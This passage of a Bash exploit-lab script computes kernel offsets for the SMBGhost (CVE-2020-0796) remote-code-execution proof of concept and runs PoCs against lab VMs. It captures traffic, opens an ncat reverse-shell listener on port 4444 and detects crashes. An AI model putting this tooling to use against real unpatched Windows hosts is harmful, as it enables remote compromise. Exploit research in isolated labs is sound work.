# SUBCOMMAND: offsets — extract and calculate exploit offsets
# ═══════════════════════════════════════════════════════════════════════════

cmd_offsets() {
    local name="" exploit="" method="vm" outfile=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --vm|-v) name="$2"; shift 2;;
            --exploit|-e) exploit="$2"; shift 2;;
            --method|-m) method="$2"; shift 2;;
            --out|-o) outfile="$2"; shift 2;;
            *) name="${name:-$1}"; shift;;
        esac
    done
    [[ -z "$name" ]] && die "Usage: xdev-lab offsets --vm <name> --exploit smbghost [--method vm|linux] [--out file]"
    local ip; ip=$(require_vm "$name")

    case "${exploit,,}" in
        smbghost|smbleed|smbleedingghost|cve-2020-0796)
            _offsets_smbghost "$ip" "$name" "$method" "$outfile";;
        *)
            die "Unknown exploit: $exploit. Known: smbghost";;
    esac
}

_offsets_smbghost() {
    local ip="$1" name="$2" method="$3" outfile="$4"
    log "Calculating SMBGhost offsets for $name ($ip)..."

    if [[ "$method" == "vm" ]]; then
        # Upload tools and run calc_target_offsets on the VM
        local poc_dir="$LAB/exploits/CVE-2020-0796-RCE-POC"
        [[ -d "$poc_dir/tools" ]] || die "PoC tools not found at $poc_dir/tools/"

        log "Uploading offset calculation tools to VM..."
        vm_exec "$ip" 'cmd /c mkdir C:\OffsetCalc\tools 2>nul' 2>/dev/null
        for f in "$poc_dir/tools/"*; do
            vm_upload "$ip" "$f" "OffsetCalc/tools/$(basename "$f")" 2>/dev/null
        done
        vm_upload "$ip" "$poc_dir/calc_target_offsets.bat" "OffsetCalc/calc_target_offsets.bat" 2>/dev/null
        ok "Tools uploaded"

        log "Running offset calculation (downloading symbols may take a minute)..."
        local raw
        raw=$(vm_exec "$ip" 'cmd /c cd C:\OffsetCalc && calc_target_offsets.bat' 2>/dev/null)

        # Parse the output — the script outputs lines like:
        #     'srvnet!SrvNetWskConnDispatch': 0x2D170, #
        local offsets
        offsets=$(echo "$raw" | grep -oP "'[^']+': 0x[0-9A-Fa-f]+" | tr -d "'" | sed 's/: / = /')
        if [[ -z "$offsets" ]]; then
            warn "Could not parse offsets from VM output. Raw output:"
            echo "$raw"
            return 1
        fi

        echo ""
        echo "OFFSETS = {"
        echo "$raw" | grep -oP "'[^']+':\s*0x[0-9A-Fa-f]+" | sed 's/^/    /' | sed '$ s/$/\n}/'
        echo "}"
        echo ""

        if [[ -n "$outfile" ]]; then
            echo "$raw" | grep -oP "'[^']+':\s*0x[0-9A-Fa-f]+" > "$outfile"
            ok "Offsets saved to $outfile"
        fi

        # Clean up
        vm_exec "$ip" 'cmd /c rmdir /S /Q C:\OffsetCalc' 2>/dev/null

    elif [[ "$method" == "linux" ]]; then
        # Extract binaries and analyze with radare2
        local tmpdir=$(mktemp -d)
        log "Extracting srvnet.sys and ntoskrnl.exe from VM..."
        vm_download "$ip" "Windows/System32/drivers/srvnet.sys" "$tmpdir/srvnet.sys"
        vm_download "$ip" "Windows/System32/ntoskrnl.exe" "$tmpdir/ntoskrnl.exe"
        ok "Binaries extracted to $tmpdir/"

        log "Analyzing with radare2..."
        local srvnet_dispatch srvnet_iat_iosizeof srvnet_iat_rtlcopy nt_iosizeof nt_migetpte

        srvnet_dispatch=$(r2 -q -e bin.relocs.apply=true -c 'is~SrvNetWskConnDispatch[1]' "$tmpdir/srvnet.sys" 2>/dev/null | head -1)
        nt_iosizeof=$(r2 -q -e bin.relocs.apply=true -c 'is~IoSizeofWorkItem[1]' "$tmpdir/ntoskrnl.exe" 2>/dev/null | head -1)
        nt_migetpte=$(r2 -q -e bin.relocs.apply=true -c 'is~MiGetPteAddress[1]' "$tmpdir/ntoskrnl.exe" 2>/dev/null | head -1)

        # IAT offsets need import table parsing
        srvnet_iat_iosizeof=$(r2 -q -c 'ii~IoSizeofWorkItem[0]' "$tmpdir/srvnet.sys" 2>/dev/null | head -1)
        srvnet_iat_rtlcopy=$(r2 -q -c 'ii~RtlCopyUnicodeString[0]' "$tmpdir/srvnet.sys" 2>/dev/null | head -1)

        echo ""
        echo "OFFSETS = {"
        echo "    'srvnet!SrvNetWskConnDispatch': ${srvnet_dispatch:-UNKNOWN},"
        echo "    'srvnet!imp_IoSizeofWorkItem': ${srvnet_iat_iosizeof:-UNKNOWN},"
        echo "    'srvnet!imp_RtlCopyUnicodeString': ${srvnet_iat_rtlcopy:-UNKNOWN},"
        echo "    'nt!IoSizeofWorkItem': ${nt_iosizeof:-UNKNOWN},"
        echo "    'nt!MiGetPteAddress': ${nt_migetpte:-UNKNOWN}"
        echo "}"

        if [[ -n "$outfile" ]]; then
            {
                echo "srvnet!SrvNetWskConnDispatch = ${srvnet_dispatch:-UNKNOWN}"
                echo "srvnet!imp_IoSizeofWorkItem = ${srvnet_iat_iosizeof:-UNKNOWN}"
                echo "srvnet!imp_RtlCopyUnicodeString = ${srvnet_iat_rtlcopy:-UNKNOWN}"
                echo "nt!IoSizeofWorkItem = ${nt_iosizeof:-UNKNOWN}"
                echo "nt!MiGetPteAddress = ${nt_migetpte:-UNKNOWN}"
            } > "$outfile"
            ok "Offsets saved to $outfile"
        fi
        ok "Binaries at: $tmpdir/"
    else
        die "Unknown method: $method (use 'vm' or 'linux')"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# SUBCOMMAND: exploit-test — run PoC with monitoring
# ═══════════════════════════════════════════════════════════════════════════

cmd_exploit_test() {
    local name="" poc="" poc_args="" expect="crash" timeout=120 listen_port=""
    while [[ $# -gt 0 ]]; do
        case "$1" in
            --vm|-v) name="$2"; shift 2;;
            --poc|-p) poc="$2"; shift 2;;
            --args|-a) poc_args="$2"; shift 2;;
            --expect) expect="$2"; shift 2;;
            --timeout) timeout="$2"; shift 2;;
            --listen) listen_port="$2"; shift 2;;
            *) name="${name:-$1}"; shift;;
        esac
    done
    [[ -z "$name" || -z "$poc" ]] && die "Usage: xdev-lab exploit-test --vm <name> --poc <script> [--args '...'] [--expect crash|shell|timeout] [--timeout N] [--listen port]"
    [[ -f "$poc" ]] || die "PoC not found: $poc"
    local ip; ip=$(require_vm "$name")

    local ts=$(date +%Y%m%d_%H%M%S)
    local results_dir="$LAB/results/${name}_${ts}"
    mkdir -p "$results_dir"

    log "══════════════════════════════════════════"
    log " EXPLOIT TEST: $(basename "$poc")"
    log " Target: $name ($ip)"
    log " Expect: $expect  Timeout: ${timeout}s"
    log "══════════════════════════════════════════"

    # ── 1. snapshot ──
    if ! vm_running "$name"; then
        die "VM must be running"
    fi

    # ── 2. start packet capture ──
    log "Starting packet capture..."
    local pcap="$results_dir/capture.pcap"
    sudo tcpdump -i "$BRIDGE" host "$ip" -w "$pcap" -c 10000 &>/dev/null &
    local tcpdump_pid=$!

    # ── 3. start listener if expecting shell ──
    local ncat_pid=""
    if [[ "$expect" == "shell" ]]; then
        [[ -z "$listen_port" ]] && listen_port=4444
        log "Starting ncat listener on port $listen_port..."
        ncat -lvp "$listen_port" > "$results_dir/shell_output.txt" 2>&1 &
        ncat_pid=$!
    fi

    # ── 4. run the PoC ──
    log "Running PoC: python3 $poc $poc_args"
    timeout "$timeout" python3 "$poc" $poc_args > "$results_dir/poc_output.txt" 2>&1 &
    local poc_pid=$!

    # ── 5. monitor ──
    local result="timeout"
    local elapsed=0
    while (( elapsed < timeout )); do
        sleep 5
        elapsed=$((elapsed + 5))

        # check if PoC finished
        if ! kill -0 "$poc_pid" 2>/dev/null; then
            wait "$poc_pid" 2>/dev/null
            local poc_exit=$?
            if [[ "$expect" == "shell" && -n "$ncat_pid" ]] && ! kill -0 "$ncat_pid" 2>/dev/null; then
                result="shell"
                break
            fi
            result="poc_exited_${poc_exit}"
            break
        fi

        # check for shell connection
        if [[ "$expect" == "shell" && -n "$ncat_pid" ]]; then
            if [[ -s "$results_dir/shell_output.txt" ]]; then
                result="shell"
                break
            fi
        fi

        # check if VM crashed (not responding to ping)
        if ! ping -c1 -W2 "$ip" &>/dev/null; then
            sleep 5
            if ! ping -c1 -W2 "$ip" &>/dev/null; then
                result="crash"
                break
            fi
        fi

        (( elapsed % 30 == 0 )) && log "Waiting... (${elapsed}/${timeout}s)"
    done

    # ── 6. cleanup ──
    kill "$poc_pid" 2>/dev/null; wait "$poc_pid" 2>/dev/null || true
    [[ -n "$ncat_pid" ]] && { kill "$ncat_pid" 2>/dev/null; wait "$ncat_pid" 2>/dev/null || true; }
    kill "$tcpdump_pid" 2>/dev/null; wait "$tcpdump_pid" 2>/dev/null || true

    # ── 7. collect crash dumps if crashed ──
    if [[ "$result" == "crash" ]]; then
        log "VM crashed! Attempting to collect crash dumps..."
        # VM may reboot — wait for it
        local cw=0
        while ! ping -c1 -W2 "$ip" &>/dev/null; do
            sleep 10; cw=$((cw+10)); (( cw >= 120 )) && break
        done
        if ping -c1 -W2 "$ip" &>/dev/null; then
            sleep 30 # let services start
            vm_download "$ip" "Windows/debug/netlogon.log" "$results_dir/netlogon.log" 2>/dev/null || true
            vm_exec "$ip" 'powershell -Command "Get-WinEvent -LogName System -MaxEvents 20 | Format-List"' > "$results_dir/event_log.txt" 2>/dev/null || true
            # try crash dumps
            vm_exec "$ip" 'cmd /c dir C:\CrashDumps\' >> "$results_dir/crash_dump_list.txt" 2>/dev/null || true
            vm_exec "$ip" 'cmd /c dir C:\Windows\Minidump\' >> "$results_dir/crash_dump_list.txt" 2>/dev/null || true
        fi
    fi

    # ── 8. report ──
    echo ""
    echo "════════════════════════════════════════"
    case "$result" in
        shell)
            ok "RESULT: SHELL OBTAINED"
            [[ -s "$results_dir/shell_output.txt" ]] && { echo "Shell output:"; head -20 "$results_dir/shell_output.txt"; }
            ;;
        crash)
            warn "RESULT: VM CRASHED (BSOD)"
            ;;
        timeout)
            warn "RESULT: TIMEOUT (${timeout}s)"
            ;;
        poc_exited_*)
            local code="${result#poc_exited_}"
            warn "RESULT: PoC exited with code $code"
            ;;
    esac
    echo "════════════════════════════════════════"
    echo ""
    ok "Results: $results_dir/"
    ok "  PCAP: $pcap"
    ok "  PoC output: $results_dir/poc_output.txt"
    [[ -s "$results_dir/shell_output.txt" ]] && ok "  Shell: $results_dir/shell_output.txt"
    echo ""
    echo "$result" > "$results_dir/result.txt"
}

